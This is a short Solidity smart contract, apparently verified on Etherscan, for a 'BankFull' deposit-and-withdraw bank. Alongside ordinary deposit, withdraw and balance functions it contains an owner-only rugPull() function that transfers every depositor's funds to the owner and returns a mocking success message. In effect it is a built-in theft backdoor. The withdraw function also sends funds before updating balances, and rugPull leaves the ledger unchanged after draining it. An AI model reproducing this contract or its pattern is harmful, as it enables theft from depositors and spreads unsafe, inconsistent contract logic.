/**
 *Submitted for verification at Etherscan.io on 2022-04-27
*/

///SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BankFull {
    mapping(address => uint) _balance;
    address public owner;
    uint _contractBalance;
    event Deposit(address indexed owner,uint amount);
    event Withdraw(address indexed owner, uint amount);


constructor(){
    owner = msg.sender;
    _contractBalance = 0;
}

    function deposit() public payable {
        require(msg.value > 0, "deposit money");
        _balance[msg.sender] += msg.value;
        _contractBalance += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint withdrawAmount) public {
        require(withdrawAmount > 0 && withdrawAmount <= _balance[msg.sender], "not enough!!!");
        payable(msg.sender).transfer(withdrawAmount);
        _balance[msg.sender] -= withdrawAmount;
        _contractBalance -= withdrawAmount;
        emit Withdraw(msg.sender,  withdrawAmount);
    }

    function checkBalance() public view returns(uint balance){
        return _balance[msg.sender];
    }

    function checkBalanceOf(address customerAdr) public view returns(uint balance){
        return _balance[customerAdr];
    }

    function rugPull() public returns(string memory){
        require(msg.sender == owner, "U can't rugpull!!");
        // string memory contractBalance;
        // string memory contractBalance;
        payable(msg.sender).transfer(_contractBalance);

        return "Rugpull successfully lol" ;
    }

}